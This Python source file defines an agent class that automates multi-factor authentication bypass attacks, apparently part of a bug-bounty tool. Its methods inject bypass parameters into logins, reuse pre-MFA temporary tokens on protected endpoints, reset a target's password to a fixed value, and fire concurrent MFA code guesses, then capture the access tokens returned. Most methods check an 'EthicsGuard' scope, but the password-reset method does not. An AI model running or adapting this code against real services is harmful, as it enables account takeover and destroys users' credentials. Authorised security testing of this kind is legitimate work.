"""
MFABypasser: 多要素認証バイパス専門エージェント

MFAバイパスのための攻撃手法を実装:
- 2FA Reset Flow: パスワードリセット経由のMFAスキップ
- Backup Code Reuse: バックアップコードの再利用
- Direct API Access: MFAチェックをスキップするAPI
- Response Manipulation: mfa_required:false への書き換え
- Race Condition: 同時リクエストでのバイパス

RAG連携: Obsidianノートからビジネスロジックバイパス手法を取得
EthicsGuard連携: スコープ内のみリクエスト送信
"""

from typing import Optional
import logging

# Security imports
from src.core.security.ethics_guard import (
    get_ethics_guard,
    ActionType,
    ActionResult,
)
from src.core.models.finding import Finding, Evidence, Severity, VulnType

# Handoff Protocol (Context-Aware Handoff 2.0)
from src.tools.builtin.handoff import (
    HandoffContext,
    HandoffResult,
    HandoffStatus,
    create_handoff_result,
)
from src.core.agents.base import AgentConfig

# Base auth agent
from .auth_ninja_base import BaseAuthAgent

from src.core.utils.asset_loader import asset_loader


class MFABypasser(BaseAuthAgent):
    """
    MFA-Bypasser: 多要素認証バイパス専門
    
    攻撃手法:
    - 2FA Reset Flow: パスワードリセット経由のMFAスキップ
    - Backup Code Reuse: バックアップコードの再利用
    - Direct API Access: MFAチェックをスキップするAPI
    - Response Manipulation: mfa_required:false への書き換え
    - Race Condition: 同時リクエストでのバイパス
    
    RAG連携: Obsidianノートからビジネスロジックバイパス手法を取得
    EthicsGuard連携: スコープ内のみリクエスト送信
    """
    
    def __init__(self, config: AgentConfig = None, workspace_root: Optional[str] = None, rag_switch=None, program_name: str = ""):
        if config is None:
            config = AgentConfig(
                name="MFA-Bypasser",
                description="Multi-factor authentication bypass specialist agent",
                model="default",
                instructions="Execute MFA bypass attacks"
            )
        super().__init__(config, workspace_root=workspace_root)
        
        # Note: self.name is inherited from BaseAgent (property accessing config.name)
        self._rag_switch = rag_switch
        self._guard = get_ethics_guard()
        self._program_name = program_name
        self._payloads = None

    @property
    def payloads(self):
        if self._payloads is None:
             self._payloads = asset_loader.load_yaml("auth_payloads.yaml").get("mfa_bypasser", {})
        return self._payloads

    @property
    def STR_MFA_BYPASS_PARAMS(self):
         return self.payloads.get("bypass_params", [])

    @property
    def STR_MFA_RESPONSE_FIELDS(self):
         return self.payloads.get("response_fields", [])
    
    def set_rag_switch(self, rag_switch) -> None:
        """RAGSwitchを設定"""
        self._rag_switch = rag_switch
    
    async def execute(self, context: HandoffContext) -> HandoffResult:
        """
        MFAバイパスを試行
        
        Required metadata:
        - login_endpoint: ログインエンドポイント
        - credentials: 認証情報 (username, password)
        - session_token: (optional) 既存のセッショントークン
        - mfa_endpoint: (optional) MFA検証エンドポイント
        """
        target = context.target_url
        params = context.metadata
        
        # 初期結果
        result = create_handoff_result(
            agent_name=self.name,
            status="failed",
            target_url=target,
        )
        
        # EthicsGuard: スコープチェック
        is_allowed, reason = self._guard.check_action(ActionType.HTTP_REQUEST, target)
        if is_allowed != ActionResult.ALLOWED:
            result.status = HandoffStatus.BLOCKED
            result.error = reason
            return result
        
        methods = [
            ("direct_api", VulnType.MFA_BYPASS, self._try_direct_api),
            ("response_manipulation", VulnType.MFA_BYPASS, self._try_response_manipulation),
            ("reset_flow", VulnType.MFA_BYPASS, self._try_reset_flow),
            ("race_condition", VulnType.MFA_BYPASS, self._try_race_condition),
        ]
        
        for method_name, vuln_type, method_func in methods:
            attack_result = await method_func(target, params)
            if attack_result.get("success"):
                finding = self._create_finding(
                    target=target,
                    method_name=method_name,
                    vuln_type=vuln_type,
                    result=attack_result,
                    params=params,
                )
                
                result.status = HandoffStatus.SUCCESS
                result.bypass_method = method_name
                result.credentials = attack_result.get("credentials", {})
                result.recommendations = [
                    f"MFA bypass succeeded via {method_name}",
                    "This is typically a HIGH/CRITICAL severity finding",
                    "Full account takeover possible without second factor",
                ]
                result.success_probability = 0.9
                result.response_data = attack_result.get("details", {})
                result.findings = [finding.to_dict()] if finding else []
                result.vulnerability_hypothesis = f"MFA {method_name} vulnerability confirmed"
                
                self.log_attempt(target, method_name, True)
                
                # 共有ワークスペースに保存
                if finding:
                    await self.save_finding(finding.to_dict())
                
                break
            else:
                self.log_attempt(target, method_name, False)
        
        return result
    
    def _create_finding(
        self,
        target: str,
        method_name: str,
        vuln_type: VulnType,
        result: dict,
        params: dict,
    ) -> Finding:
        """成功した攻撃からFindingを生成"""
        details = result.get("details", {})
        
        title_map = {
            "direct_api": "MFA Bypass via Direct API Access",
            "response_manipulation": "MFA Bypass via Response Manipulation",
            "reset_flow": "MFA Bypass via Password Reset Flow",
            "race_condition": "MFA Bypass via Race Condition",
        }
        
        return Finding(
            vuln_type=vuln_type,
            severity=Severity.CRITICAL,
            title=title_map.get(method_name, f"MFA Bypass via {method_name}"),
            description=(
                f"The multi-factor authentication implementation is vulnerable to {method_name}. "
                f"An attacker can bypass MFA entirely and gain full access to user accounts."
            ),
            target_url=target,
            target_program=self._program_name,
            evidence=Evidence(
                request_method=result.get("request_method", "POST"),
                request_url=result.get("vulnerable_url", target),
                request_body=result.get("request_body", ""),
                response_status=result.get("response_status", 200),
                response_body=result.get("response_body", "")[:500],
            ),
            reproduction_steps=result.get("reproduction_steps", []),
            impact=(
                "An attacker can bypass multi-factor authentication and gain full access "
                "to user accounts. This completely negates the security benefit of MFA "
                "and allows account takeover with only primary credentials."
            ),
            source_agent="mfa_bypasser",
            confidence=0.9,
            cwe_id="CWE-287",
            additional_info=details,
        )
    
    async def _try_direct_api(self, target: str, params: dict) -> dict:
        """
        MFAチェックをスキップするAPIエンドポイント探索
        
        RAGからビジネスロジックバイパス手法を取得し、
        mfa_required: false などのパラメータを試行。
        """
        import json
        
        login_endpoint = params.get("login_endpoint", target)
        credentials = params.get("credentials", {})
        session_token = params.get("session_token", "")
        
        if not credentials:
            return {"success": False, "error": "No credentials provided"}
        
        # EthicsGuard チェック
        is_allowed, _ = self._guard.check_action(ActionType.HTTP_REQUEST, login_endpoint)
        if is_allowed != ActionResult.ALLOWED:
            return {"success": False, "error": "Blocked by EthicsGuard"}
        
        # RAGからバイパス手法を取得
        bypass_techniques = []
        if self._rag_switch and self._rag_switch.enabled:
            rag_techniques = self._rag_switch.get_bypass_techniques("mfa_bypass")
            for tech in rag_techniques:
                payload = tech.get("payload", "")
                if payload:
                    try:
                        # JSONとしてパース可能ならパラメータとして追加
                        bypass_params = json.loads(payload) if payload.startswith("{") else {}
                        if bypass_params:
                            bypass_techniques.append(bypass_params)
                    except json.JSONDecodeError:
                        pass
        
        # デフォルトのバイパスパラメータとRAGからのパラメータを結合
        all_bypass_params = self.STR_MFA_BYPASS_PARAMS + bypass_techniques
        
        # 各バイパスパラメータで試行
        for bypass_param in all_bypass_params:
            # ログインリクエストを構築
            login_data = {**credentials, **bypass_param}
            
            headers = {"Content-Type": "application/json"}
            if session_token:
                headers["Authorization"] = f"Bearer {session_token}"
            
            try:
                response = await self.network_client.request(
                    method="POST",
                    url=login_endpoint,
                    json=login_data,
                    headers=headers,
                    timeout=params.get("timeout", 10),
                    use_proxy=True
                )
                
                # 成功判定: 
                # 1. 200/201でMFA不要のアクセストークンが返る
                # 2. MFAチャレンジがスキップされる
                if response.status in (200, 201):
                    try:
                        resp_json = response.json()
                        
                        # アクセストークンが返っている場合
                        if any(k in resp_json for k in ["access_token", "token", "session"]):
                            # かつ、MFA要求がない場合
                            if not any(resp_json.get(field, False) for field in self.STR_MFA_RESPONSE_FIELDS):
                                return {
                                    "success": True,
                                    "bypass_pattern": "Direct API with MFA flag",
                                    "vulnerable_url": login_endpoint,
                                    "request_method": "POST",
                                    "request_body": json.dumps(login_data),
                                    "response_status": response.status,
                                    "response_body": response.text[:500],
                                    "credentials": {
                                        "bypass_params": bypass_param,
                                        "access_token": resp_json.get("access_token", resp_json.get("token", "")),
                                    },
                                    "details": {
                                        "bypass_params": bypass_param,
                                        "rag_assisted": bool(bypass_techniques),
                                    },
                                    "reproduction_steps": [
                                        f"1. Send POST request to {login_endpoint}",
                                        f"2. Include bypass parameter: {bypass_param}",
                                        f"3. Observe that MFA is not required",
                                        f"4. Access token is returned directly",
                                    ],
                                }
                    except (json.JSONDecodeError, KeyError):
                        pass
                        
            except Exception:
                continue
        
        return {"success": False, "error": "Direct API bypass failed"}
    
    async def _try_response_manipulation(self, target: str, params: dict) -> dict:
        """
        レスポンス操作によるMFAバイパス
        
        認証レスポンス内のmfa_required: trueを検出し、
        これがクライアントサイドでのみチェックされている場合を特定。
        """
        import json
        
        login_endpoint = params.get("login_endpoint", target)
        credentials = params.get("credentials", {})
        mfa_endpoint = params.get("mfa_endpoint", "")
        
        if not credentials:
            return {"success": False, "error": "No credentials provided"}
        
        # EthicsGuard チェック
        is_allowed, _ = self._guard.check_action(ActionType.HTTP_REQUEST, login_endpoint)
        if is_allowed != ActionResult.ALLOWED:
            return {"success": False, "error": "Blocked by EthicsGuard"}
        
        try:
            # Step 1: 通常のログインリクエスト
            response = await self.network_client.request(
                method="POST",
                url=login_endpoint,
                json=credentials,
                headers={"Content-Type": "application/json"},
                timeout=params.get("timeout", 10),
                use_proxy=True
            )
            
            if response.status not in (200, 201):
                return {"success": False, "error": "Login failed"}
            
            try:
                resp_json = response.json()
            except json.JSONDecodeError:
                return {"success": False, "error": "Non-JSON response"}
            
            # Step 2: MFA要求を検出
            mfa_required_field = None
            for field in self.STR_MFA_RESPONSE_FIELDS:
                if resp_json.get(field):
                    mfa_required_field = field
                    break
            
            if not mfa_required_field:
                return {"success": False, "error": "No MFA field found in response"}
            
            # Step 3: セッショントークンを取得（一時的なもの）
            temp_token = (
                resp_json.get("temp_token") or
                resp_json.get("mfa_token") or
                resp_json.get("session_token") or
                resp_json.get("token")
            )
            
            if not temp_token:
                return {"success": False, "error": "No session token in response"}
            
            # Step 4: MFAをスキップしてプロテクテッドエンドポイントにアクセス
            protected_endpoint = params.get("protected_endpoint", "")
            if protected_endpoint:
                is_allowed, _ = self._guard.check_action(ActionType.HTTP_REQUEST, protected_endpoint)
                if is_allowed != ActionResult.ALLOWED:
                    return {"success": False, "error": "Protected endpoint blocked"}
                
                protected_response = await self.network_client.request(
                    method="GET",
                    url=protected_endpoint,
                    headers={"Authorization": f"Bearer {temp_token}"},
                    timeout=params.get("timeout", 10),
                    use_proxy=True
                )
                
                # MFAをスキップしてアクセスできた場合
                if protected_response.status == 200:
                    return {
                        "success": True,
                        "bypass_pattern": "Response Manipulation",
                        "vulnerable_url": protected_endpoint,
                        "response_status": protected_response.status,
                        "details": {
                            "mfa_field": mfa_required_field,
                            "temp_token_used": True,
                            "note": "MFA check is client-side only",
                        },
                        "reproduction_steps": [
                            f"1. Login with credentials to get temporary token",
                            f"2. Note the '{mfa_required_field}': true in response",
                            f"3. Ignore MFA and use the temporary token directly",
                            f"4. Access protected resource: {protected_endpoint}",
                            f"5. Observe successful access without MFA completion",
                        ],
                    }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "Response manipulation bypass failed"}
    
    async def _try_reset_flow(self, target: str, params: dict) -> dict:
        """パスワードリセットフロー経由のMFAスキップ"""
        
        # 必要なパラメータ:
        # - reset_init_url: パスワードリセット開始URL
        # - reset_complete_url: パスワードリセット完了URL（トークン付き）
        # - protected_endpoint: 保護されたリソース
        
        reset_init_url = params.get("reset_init_url")
        reset_complete_url = params.get("reset_complete_url")
        protected_endpoint = params.get("protected_endpoint", target)
        new_password = "NewStrongPassword123!"
        
        if not reset_init_url or not reset_complete_url:
            return {"success": False, "error": "Missing reset flow URLs"}
            
        try:
            # 1. パスワードリセット完了を実行
            # (多くの実装ではリセット後に自動ログインするが、その際にMFAフラグが落ちることがある)
            reset_data = {
                "password": new_password,
                "password_confirm": new_password,
                "token": params.get("reset_token", "dummy_token")
            }
            
            resp = await self.network_client.request(
                method="POST", 
                url=reset_complete_url, 
                data=reset_data, 
                timeout=10,
                use_proxy=True
            )
            
            # リセット後のセッションで保護リソースにアクセス
            # AsyncNetworkClient preserves cookies (session)
            check_resp = await self.network_client.request(
                method="GET",
                url=protected_endpoint, 
                timeout=10,
                use_proxy=True
            )
            
            if check_resp.status == 200 and "MFA" not in check_resp.text:
                 return {
                    "success": True,
                    "bypass_pattern": "Password Reset MFA Bypass",
                    "vulnerable_url": reset_complete_url,
                    "details": {
                        "note": "MFA state cleared after password reset",
                        "final_status": check_resp.status
                    },
                    "reproduction_steps": [
                        f"1. Initiate password reset flow",
                        f"2. Complete reset with new password",
                        f"3. Access protected resource: {protected_endpoint}",
                        f"4. Observe access granted without MFA prompt",
                    ],
                }
                
        except Exception:
            pass

        return {"success": False, "error": "Reset flow bypass failed"}
    
    async def _try_race_condition(self, target: str, params: dict) -> dict:
        """レースコンディションによるバイパス"""
        import asyncio
        
        # 4桁のコードなどを並列送信
        mfa_verify_url = params.get("mfa_verify_url", target)
        base_code = 1000
        attempts = 20 # 並列数
        
        payloads = [{"code": str(base_code + i)} for i in range(attempts)]
        
        async def send_request(payload):
            try:
                r = await self.network_client.request(
                    method="POST", 
                    url=mfa_verify_url, 
                    json=payload, 
                    timeout=5,
                    use_proxy=True
                )
                # 成功判定 (例: 302リダイレクト、あるいはToken返却)
                if r.status in [302, 200] and "error" not in r.text.lower():
                    return (True, payload)
            except Exception:
                pass
            return (False, payload)

        try:
            results = await asyncio.gather(*[send_request(p) for p in payloads])
            
            for success, payload in results:
                if success:
                    return {
                        "success": True,
                        "bypass_pattern": "MFA Race Condition",
                        "vulnerable_url": mfa_verify_url,
                        "details": {"payload": payload, "concurrency": attempts},
                        "reproduction_steps": [
                            f"1. Prepare {attempts} concurrent requests with different codes",
                            f"2. Send requests simultaneously to {mfa_verify_url}",
                            f"3. Observe one or more requests succeeding despite rate limits",
                        ],
                    }
        except Exception as e:
            return {"success": False, "error": f"Race condition check failed: {str(e)}"}
        
        return {"success": False, "error": "Race condition check failed or no success"}
        return {"success": False, "error": "Race condition check failed or no success"}
